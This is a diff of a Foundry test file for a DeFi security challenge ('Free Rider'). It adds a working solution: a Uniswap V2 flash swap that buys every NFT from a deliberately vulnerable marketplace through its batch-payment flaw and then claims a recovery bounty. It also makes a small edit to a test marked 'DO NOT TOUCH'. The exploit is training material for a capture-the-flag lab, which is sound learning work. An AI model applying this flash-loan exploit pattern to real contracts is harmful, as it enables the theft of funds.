@@ -58,9 +58,17 @@ contract FreeRiderChallenge is Test {
         weth = new WETH();
 
         // Deploy Uniswap V2 Factory and Router
-        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
+        uniswapV2Factory = IUniswapV2Factory(
+            deployCode(
+                "builds/uniswap/UniswapV2Factory.json",
+                abi.encode(address(0))
+            )
+        );
         uniswapV2Router = IUniswapV2Router02(
-            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
+            deployCode(
+                "builds/uniswap/UniswapV2Router02.json",
+                abi.encode(address(uniswapV2Factory), address(weth))
+            )
         );
 
         token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
@@ -74,11 +82,15 @@ contract FreeRiderChallenge is Test {
         );
 
         // Get a reference to the created Uniswap pair
-        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));
+        uniswapPair = IUniswapV2Pair(
+            uniswapV2Factory.getPair(address(token), address(weth))
+        );
 
         // Deploy the marketplace and get the associated ERC721 token
         // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
-        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
+        marketplace = new FreeRiderNFTMarketplace{
+            value: MARKETPLACE_INITIAL_ETH_BALANCE
+        }(AMOUNT_OF_NFTS);
 
         // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
         nft = marketplace.token();
@@ -94,8 +106,12 @@ contract FreeRiderChallenge is Test {
         marketplace.offerMany(ids, prices);
 
         // Deploy recovery manager contract, adding the player as the beneficiary
-        recoveryManager =
-            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);
+        recoveryManager = new FreeRiderRecoveryManager{value: BOUNTY}(
+            player,
+            address(nft),
+            recoveryManagerOwner,
+            BOUNTY
+        );
 
         vm.stopPrank();
     }
@@ -103,7 +119,7 @@ contract FreeRiderChallenge is Test {
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
-    function test_assertInitialState() public view {
+    function test_assertInitialState() public {
         assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
         assertEq(uniswapPair.token0(), address(weth));
         assertEq(uniswapPair.token1(), address(token));
@@ -115,15 +131,102 @@ contract FreeRiderChallenge is Test {
             assertEq(nft.ownerOf(id), deployer);
         }
         assertEq(marketplace.offersCount(), 6);
-        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
+        assertTrue(
+            nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner)
+        );
         assertEq(address(recoveryManager).balance, BOUNTY);
     }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
+
+    function uniswapV2Call(
+        address sender,
+        uint amount0,
+        uint amount1,
+        bytes calldata data
+    ) external {
+        console.log("uniswapV2Call invoked with sender:", sender);
+        console.log("amount0:", amount0);
+        console.log("amount1:", amount1);
+        console.log("weth balance of player:", weth.balanceOf(player));
+        console.log(
+            "weth balance of test contract:",
+            weth.balanceOf(address(this))
+        );
+
+        weth.transfer(player, weth.balanceOf(address(this)));
+        console.log(
+            "weth balance of player after transfer:",
+            weth.balanceOf(player)
+        );
+        console.log(
+            "weth balance of test contract after transfer:",
+            weth.balanceOf(address(this))
+        );
+        console.log(
+            "weth balance of msg sender after transfer:",
+            weth.balanceOf(msg.sender)
+        );
+
+        vm.startPrank(player);
+        weth.withdraw(weth.balanceOf(address(player)));
+
+        console.log("player native ETH balance: ", player.balance);
+        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            tokenIds[i] = i;
+        }
+
+        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
+
+        console.log(
+            "player native ETH balance before nft transfer to recovery manager: ",
+            player.balance
+        );
+
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            nft.safeTransferFrom(
+                player,
+                address(recoveryManager),
+                i,
+                abi.encode(player)
+            );
+        }
+
+        console.log(
+            "player native ETH balance after nft transfer to recovery manager: ",
+            player.balance
+        );
+        weth.deposit{value: NFT_PRICE + PLAYER_INITIAL_ETH_BALANCE}();
+        weth.transfer(msg.sender, weth.balanceOf(player));
+        vm.stopPrank();
+
+        console.log("final player native ETH balance: ", player.balance);
+        console.log(
+            "final weth balance of player after transfer:",
+            weth.balanceOf(player)
+        );
+        console.log(
+            "final weth balance of test contract after transfer:",
+            weth.balanceOf(address(this))
+        );
+        console.log(
+            "final weth balance of msg sender after transfer:",
+            weth.balanceOf(msg.sender)
+        );
+    }
+
     function test_freeRider() public checkSolvedByPlayer {
-        
+        uniswapPair.swap(
+            NFT_PRICE,
+            0,
+            address(this),
+            abi.encode(player, NFT_PRICE, 0)
+        );
+
+        console.log("final player native ETH balance: ", player.balance);
     }
 
     /**
@@ -133,7 +236,11 @@ contract FreeRiderChallenge is Test {
         // The recovery owner extracts all NFTs from its associated contract
         for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
             vm.prank(recoveryManagerOwner);
-            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
+            nft.transferFrom(
+                address(recoveryManager),
+                recoveryManagerOwner,
+                tokenId
+            );
             assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
         }
 
